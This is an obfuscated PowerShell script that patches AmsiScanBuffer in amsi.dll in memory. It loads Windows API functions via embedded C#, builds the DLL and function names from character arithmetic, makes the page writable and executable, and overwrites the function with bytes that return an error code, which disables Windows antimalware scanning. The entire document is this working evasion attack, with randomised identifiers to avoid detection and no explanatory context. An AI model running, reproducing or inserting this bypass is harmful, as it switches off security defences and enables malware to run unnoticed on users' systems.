$bG9W_bv6nd6JUZZh3WD0 = @"
using System;
using System.Runtime.InteropServices;
public class bG9W_bv6nd6JUZZh3WD0 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr BTL, string iAyMVin_f6C);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr B1mFqSX, UIntPtr qWhey13SAkaUK, uint isUkhHJe4N4T, out uint dFp);
}
"@

Add-Type $bG9W_bv6nd6JUZZh3WD0

$t6FlfBkt_Hp_WsQEDI7 = [bG9W_bv6nd6JUZZh3WD0]::LoadLibrary("$(('àms'+'ì.d'+'ll').NormAlIze([Char]([BYTE]0x46)+[cHAR](111)+[CHaR](114+70-70)+[ChAr]([bYTE]0x6d)+[chAr]([BytE]0x44)) -replace [CHar](79+13)+[cHar]([BytE]0x70)+[cHaR](29+94)+[ChAr](77)+[chaR](78+32)+[cHar](125+43-43))")
$a9PMhiNnKI = [bG9W_bv6nd6JUZZh3WD0]::GetProcAddress($t6FlfBkt_Hp_WsQEDI7, "$([CHar](45+20)+[CHAR]([bYtE]0x6d)+[cHaR]([bYTE]0x73)+[cHar]([BytE]0x69)+[cHAR]([BYTe]0x53)+[chAR](99)+[chAR]([BYtE]0x61)+[CHAr](50+60)+[cHar](66+34-34)+[char]([BytE]0x75)+[chaR](102+9-9)+[ChaR]([bytE]0x66)+[ChaR](101)+[cHAr]([bYTe]0x72))")
$p = 0
[bG9W_bv6nd6JUZZh3WD0]::VirtualProtect($a9PMhiNnKI, [uint32]5, 0x40, [ref]$p)
$ZntUO4b3kKl4 = "0xB8"
$_x8m05 = "0x57"
$_4RlZJ = "0x00"
$LvY4Q_8VLd7 = "0x07"
$czvRgI9XiVAh = "0x80"
$GsffovB = "0xC3"
$r24VrGpggiH_kKDu = [Byte[]] ($ZntUO4b3kKl4,$_x8m05,$_4RlZJ,$LvY4Q_8VLd7,+$czvRgI9XiVAh,+$GsffovB)
[System.Runtime.InteropServices.Marshal]::Copy($r24VrGpggiH_kKDu, 0, $a9PMhiNnKI, 6)